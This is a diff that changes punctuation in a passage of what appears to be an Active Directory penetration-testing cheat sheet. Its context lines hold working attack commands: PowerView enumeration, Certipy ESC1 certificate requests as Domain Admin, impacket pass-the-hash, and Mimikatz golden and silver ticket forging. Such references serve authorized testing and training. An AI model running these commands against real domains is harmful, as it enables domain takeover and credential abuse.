@@ -122,7 +122,7 @@ No review recorded yet
 ## Post-Compromise Enumeration
 
 ```powershell
-# PowerView — key AD enumeration commands
+# PowerView: key AD enumeration commands
 Get-NetDomain                                  # Domain info, PDC, DC list
 Get-NetDomainController                        # All domain controllers
 Get-NetUser -UACFilter NOT_ACCOUNTDISABLE      # Active user accounts
@@ -227,7 +227,7 @@ ADCS misconfigurations are among the most impactful modern AD attack vectors: th
 # Find vulnerable templates with Certipy
 certipy find -u user@domain.local -p pass -dc-ip 10.10.10.10 -stdout
 
-# ESC1 exploitation — request cert as Domain Admin
+# ESC1 exploitation: request cert as Domain Admin
 certipy req -u user@domain.local -p pass \
   -dc-ip 10.10.10.10 \
   -target ca.domain.local \
@@ -284,7 +284,7 @@ impacket-psexec domain.local/administrator@10.10.10.10 -hashes :<NT_hash>
 # Mimikatz
 kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX /krbtgt:<hash> /ptt
 
-# Silver Ticket (requires service account hash — no KDC contact needed)
+# Silver Ticket (requires service account hash: no KDC contact needed)
 kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-XXXX \
   /target:sqlserver.domain.local /service:mssql /rc4:<service_hash> /ptt
 ```
